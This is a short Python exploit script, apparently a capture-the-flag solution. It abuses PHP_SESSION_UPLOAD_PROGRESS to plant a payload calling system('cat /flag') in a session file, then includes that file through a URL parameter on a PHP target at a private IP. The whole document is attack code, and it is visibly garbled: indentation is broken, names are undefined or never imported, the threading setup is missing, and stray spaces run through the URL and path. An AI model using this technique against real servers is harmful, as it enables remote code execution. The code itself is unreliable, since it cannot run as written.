#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2021/9/13 8:46
# @Author  : upload
# @File    : 1.py
# @Software: PyCharm
import io

import requests


def start_flag(s):
    global stop_threads
while True:
    if stop_threads:
        break
f = io.BytesIO(b'a' * 1024 * 50)
url = 'http://192.168.41.134:8000/?gwht = / var / lib / php5 / sess_1 & ycb = http: // 127.0.0.1'
headers = {'Cookie': 'PHPSESSID=1', }
data = {"PHP_SESSION_UPLOAD_PROGRESS": "<?php system('cat / flag');echo 'flag';?>"} # Payload 
files = {"file": ('1.txt', f)}
rest = s.post(url, headers=headers, data=data, files=files)
if 'flag' in r.text:
    print(rest.text)
exit()
if __name__ == '__main__':
    with requests.session() as session:
while thre:
    thre = threading.Thread(target=run, args=(s,))
thre.start()
thread_list.append(thre)
for t in thread_list:
    t.join()
